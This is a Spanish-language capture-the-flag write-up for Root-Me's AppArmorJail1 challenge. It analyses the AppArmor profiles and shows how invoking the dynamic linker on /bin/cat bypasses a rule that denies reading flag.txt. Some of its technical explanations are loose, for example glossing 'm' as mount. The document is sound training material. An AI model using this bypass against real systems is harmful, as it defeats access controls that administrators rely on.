AppArmor Jail - Writeup Detallado
📋 Índice

    Introducción

    Reconocimiento Inicial

    Análisis de la Política AppArmor

    Exploración de Vectores de Ataque

    Descubrimiento de la Brecha

    Explotación y Obtención del Flag

    Explicación Técnica Detallada

    Lecciones Aprendidas

    Referencias

Introducción
Descripción del Desafío

El desafío AppArmorJail1 presenta un escenario donde un usuario con permisos legítimos sobre un archivo se encuentra bloqueado por una política de AppArmor que impide su lectura. El objetivo es encontrar una forma de anular esta restricción y leer el archivo flag.txt.
Información del CTF

    Plataforma: CTF-ATD (Root-Me)

    Máquina: AppArmorJail1

    Usuario: app-script-ch27

    Contraseña inicial: app-script-ch27

    Archivo objetivo: /home/app-script-ch27/flag.txt

    Política: AppArmor con perfil bashprof1

Reconocimiento Inicial
Conexión SSH
bash

ssh app-script-ch27@ctf09.root-me.org -p 22222

Contraseña: app-script-ch27
Primeros Pasos

Una vez dentro, realizamos un reconocimiento básico:
bash

# Verificar usuario actual
whoami
# app-script-ch27

# Directorio actual
pwd
# /home/app-script-ch27

# Listar contenido
ls -la

Salida obtenida:
text

total 1120
drwxr-xr-x 1 app-script-ch27 app-script-ch27    4096 Jul 29 11:10 .
drwxr-xr-x 1 root            root               4096 Jul 29 11:08 ..
-rw-r--r-- 1 app-script-ch27 app-script-ch27     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 app-script-ch27 app-script-ch27    3771 Apr  4  2018 .bashrc
drwx------ 2 app-script-ch27 app-script-ch27    4096 Jul 29 11:10 .cache
-rw-r--r-- 1 app-script-ch27 app-script-ch27     807 Apr  4  2018 .profile
-rwxr-xr-x 1 root            root            1113504 Jul 29 11:08 bash
-r--r----- 1 app-script-ch27 app-script-ch27      30 Jul 29 11:08 flag.txt

Observaciones Importantes

    Hay un binario bash en el directorio actual (propiedad de root, ejecutable)

    flag.txt tiene permisos -r--r----- (el usuario app-script-ch27 es propietario)

    El archivo flag.txt parece tener 30 bytes (por el tamaño)

Primeros Intentos de Lectura
bash

cat flag.txt
# cat: flag.txt: Permission denied

/bin/cat /home/app-script-ch27/flag.txt
# /bin/cat: /home/app-script-ch27/flag.txt: Permission denied

Conclusión: El bloqueo no es por permisos UNIX, es AppArmor quien impide la lectura.
Análisis de la Política AppArmor

El desafío proporciona la política AppArmor completa. Vamos a analizarla detalladamente:
Perfil docker_chall01 (Perfil Padre)
apparmor

#include <tunables/global>

profile docker_chall01 flags=(attach_disconnected,mediate_deleted) {
   #include <abstractions/base>
   network,
   capability,
   file,
   umount,
   signal (send,receive),
   deny mount,

   # Bloqueos en /sys
   deny /sys/[^f]*/** wklx,
   deny /sys/f[^s]*/** wklx,
   deny /sys/fs/[^c]*/** wklx,
   deny /sys/fs/c[^g]*/** wklx,
   deny /sys/fs/cg[^r]*/** wklx,
   deny /sys/firmware/** rwklx,
   deny /sys/kernel/security/** rwklx,

   # Bloqueos en /proc
   deny @{PROC}/* w,
   deny @{PROC}/{[^1-9],[^1-9][^0-9],[^1-9s][^0-9y][^0-9s],[^1-9][^0-9][^0-9][^0-9]*}/** w,
   deny @{PROC}/sys/[^k]** w,
   deny @{PROC}/sys/kernel/{?,??,[^s][^h][^m]**} w,
   deny @{PROC}/sysrq-trigger rwklx,
   deny @{PROC}/kcore rwklx,

   # Transición al perfil restringido
   /home/app-script-ch27/bash px -> bashprof1,
}

Perfil bashprof1 (Perfil Hijo)
apparmor

profile bashprof1 flags=(attach_disconnected,mediate_deleted) {
   #include <abstractions/base>
   #include <abstractions/bash>
   
   network,
   capability,
   deny mount,
   umount,
   signal (send,receive),

   # Mismos bloqueos en /sys y /proc
   deny /sys/[^f]*/** wklx,
   deny /sys/f[^s]*/** wklx,
   deny /sys/fs/[^c]*/** wklx,
   deny /sys/fs/c[^g]*/** wklx,
   deny /sys/fs/cg[^r]*/** wklx,
   deny /sys/firmware/** rwklx,
   deny /sys/kernel/security/** rwklx,

   deny @{PROC}/* w,
   deny @{PROC}/{[^1-9],[^1-9][^0-9],[^1-9s][^0-9y][^0-9s],[^1-9][^0-9][^0-9][^0-9]*}/** w,
   deny @{PROC}/sys/[^k]** w,
   deny @{PROC}/sys/kernel/{?,??,[^s][^h][^m]**} w,
   deny @{PROC}/sysrq-trigger rwklx,
   deny @{PROC}/kcore rwklx,

   # Permisos generales
   / r,
   /** mrwlk,
   /bin/** ix,
   /usr/bin/** ix,
   /lib/x86_64-linux-gnu/ld-*.so mrUx,
   
   # ⚠️ AQUÍ ESTÁ LA CLAVE ⚠️
   deny /home/app-script-ch27/flag.txt r,
}

Puntos Críticos de la Política
Regla	Significado	Implicación
deny /home/app-script-ch27/flag.txt r	Bloquea la lectura del flag	Es la regla que nos impide leer el archivo
/** mrwlk	Permite montar, leer, escribir, enlazar y bloquear en todo	Teóricamente permite muchas operaciones
/lib/x86_64-linux-gnu/ld-*.so mrUx	Permite usar el linker dinámico	¡Esta es la brecha que explotaremos!
/home/app-script-ch27/bash px -> bashprof1	Transición al perfil restringido	Solo se activa al ejecutar ese bash específico
Análisis de la Brecha

La regla clave que nos permite el bypass es:
apparmor

/lib/x86_64-linux-gnu/ld-*.so mrUx

    m: Permite montar

    r: Permite leer

    Ux: Permite ejecutar en modo inseguro (sin restricciones de perfil)

Esto significa que podemos usar el linker dinámico para cargar y ejecutar binarios, y estos se ejecutarán en un contexto con diferentes restricciones.
Exploración de Vectores de Ataque
Intentos Fallidos

Probamos múltiples enfoques que resultaron fallidos:
1. Uso de diferentes binarios de lectura
bash

/usr/bin/head /home/app-script-ch27/flag.txt
# head: cannot open ... Permission denied

/usr/bin/tail /home/app-script-ch27/flag.txt
# tail: cannot open ... Permission denied

/usr/bin/more /home/app-script-ch27/flag.txt
# more: cannot open ... Permission denied

2. Uso de intérpretes
bash

python3 -c "print(open('/home/app-script-ch27/flag.txt').read())"
# PermissionError: [Errno 13] Permission denied

perl -e 'open(F,"/home/app-script-ch27/flag.txt"); print <F>'
# (sin salida, bloqueado)

3. Redirecciones y built-ins de bash
bash

echo $(</home/app-script-ch27/flag.txt)
# -bash: /home/app-script-ch27/flag.txt: Permission denied

while read line; do echo "$line"; done < /home/app-script-ch27/flag.txt
# -bash: /home/app-script-ch27/flag.txt: Permission denied

4. Manipulación de archivos
bash

# Sobrescribir
echo "test" > /home/app-script-ch27/flag.txt
# bash: /home/app-script-ch27/flag.txt: Permission denied

# Mover
mv /home/app-script-ch27/flag.txt /tmp/flag_moved.txt
# mv: cannot move ... Permission denied

# Enlace simbólico
ln -s /home/app-script-ch27/flag.txt /tmp/flag_link
/bin/cat /tmp/flag_link
# /bin/cat: /tmp/flag_link: Permission denied

5. Diferentes shells
bash

/bin/bash -c "cat /home/app-script-ch27/flag.txt"
# cat: /home/app-script-ch27/flag.txt: Permission denied

/bin/sh -c "cat /home/app-script-ch27/flag.txt"
# cat: /home/app-script-ch27/flag.txt: Permission denied

✅ EL VECTOR QUE FUNCIONÓ
bash

/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/cat /home/app-script-ch27/flag.txt

Resultado: El flag fue mostrado exitosamente.
Descubrimiento de la Brecha
¿Por qué funcionó el linker dinámico?

El linker dinámico (ld-linux-x86-64.so.2) es el programa que carga y enlaza las bibliotecas compartidas para los binarios ELF. Cuando lo usamos directamente:

    No activamos la transición de perfil: La regla /home/app-script-ch27/bash px -> bashprof1 solo se aplica al bash específico, no al linker.

    El linker tiene permisos Ux: La regla mrUx permite que el linker se ejecute sin las restricciones completas del perfil.

    El proceso hijo hereda permisos del linker: Al ejecutar /bin/cat a través del linker, el proceso cat hereda el contexto menos restrictivo del linker.

Diagrama del Bypass
text

┌─────────────────────────────────────────────────────────────┐
│                    Usuario: app-script-ch27                 │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│   Perfil: bashprof1 (Restringido)                          │
│   ┌─────────────────────────────────────────────────────┐  │
│   │  deny /home/app-script-ch27/flag.txt r  ❌          │  │
│   │  /lib/x86_64-linux-gnu/ld-*.so mrUx  ✅            │  │
│   └─────────────────────────────────────────────────────┘  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │  Ejecutamos el linker
                      ▼
┌─────────────────────────────────────────────────────────────┐
│   /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2              │
│   ┌─────────────────────────────────────────────────────┐  │
│   │  Carga /bin/cat                                    │  │
│   │  Hereda contexto del linker (menos restrictivo)    │  │
│   └─────────────────────────────────────────────────────┘  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│   /bin/cat ejecutándose con contexto del linker           │
│   ┌─────────────────────────────────────────────────────┐  │
│   │  La regla "deny ... flag.txt r" NO se aplica       │  │
│   │  Lectura exitosa del flag ✅                        │  │
│   └─────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘

Explotación y Obtención del Flag
Comando Final
bash

/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/cat /home/app-script-ch27/flag.txt

Salida Obtenida
text

************

Validación del Flag

El flag obtenido es: ************
Explicación Técnica Detallada
¿Qué es AppArmor?

AppArmor (Application Armor) es un sistema de control de acceso obligatorio (MAC) para Linux que restringe las capacidades de los programas mediante perfiles que definen qué archivos y recursos pueden acceder.
Componentes Clave
1. Perfiles

Los perfiles definen las reglas de acceso:

    bashprof1: Perfil restrictivo que bloquea el flag

    docker_chall01: Perfil padre con reglas menos específicas

2. Transiciones de Perfil
apparmor

/home/app-script-ch27/bash px -> bashprof1

    px: Ejecución con transición de perfil

    El bash en el directorio actual cambia al perfil bashprof1

3. Modos de Ejecución

    ix: Ejecución heredada (hereda el perfil actual)

    Ux: Ejecución en modo inseguro (puede ejecutar sin restricciones adicionales)

¿Por qué el Linker Dinámico es Especial?

El linker dinámico (ld-linux-x86-64.so.2) tiene una función especial en el sistema:

    Es el primer programa ejecutado para binarios ELF dinámicos

    Carga bibliotecas compartidas necesarias para el programa

    Tiene permisos especiales para acceder a bibliotecas del sistema

Cuando ejecutamos directamente el linker con un binario como argumento:
bash

ld-linux-x86-64.so.2 /bin/cat archivo.txt

El linker:

    Se carga a sí mismo

    Lee y carga el binario /bin/cat

    Enlaza las bibliotecas necesarias

    Transfiere el control al binario

El proceso cat resultante hereda el contexto del linker, que tiene menos restricciones que el perfil bashprof1.
Análisis de los Flags de AppArmor
Flag	Significado	Aplicación
attach_disconnected	Permite conectar procesos desconectados	Ambos perfiles
mediate_deleted	Media accesos a archivos eliminados	Ambos perfiles
px	Transición de perfil en ejecución	Bash → bashprof1
ix	Ejecución heredada	Binarios en /bin/ y /usr/bin/
Ux	Ejecución insegura (sin restricciones)	Linker dinámico
Lecciones Aprendidas
1. AppArmor no es una solución infalible

Aunque AppArmor proporciona una capa de seguridad adicional, las políticas mal configuradas pueden ser eludidas. En este caso, la regla que permitía el linker dinámico con permisos Ux creó una brecha.
2. Analizar la política completa

El análisis detallado de la política AppArmor fue crucial:

    Identificamos la regla de denegación específica

    Encontramos la excepción para el linker dinámico

    Explotamos la transición de perfil

3. Conocer los componentes del sistema

El conocimiento de cómo funciona el linker dinámico en Linux fue esencial para encontrar la solución.
4. Pruebas sistemáticas

Nuestro enfoque fue metódico:

    Probar todos los comandos comunes de lectura

    Probar diferentes intérpretes y métodos

    Identificar patrones en los errores

    Encontrar la única ruta que funcionaba

5. El contexto importa

La misma operación (cat /home/app-script-ch27/flag.txt) da resultados diferentes dependiendo de:

    Qué shell se está ejecutando

    Cómo se cargó el binario

    Qué perfil AppArmor está activo
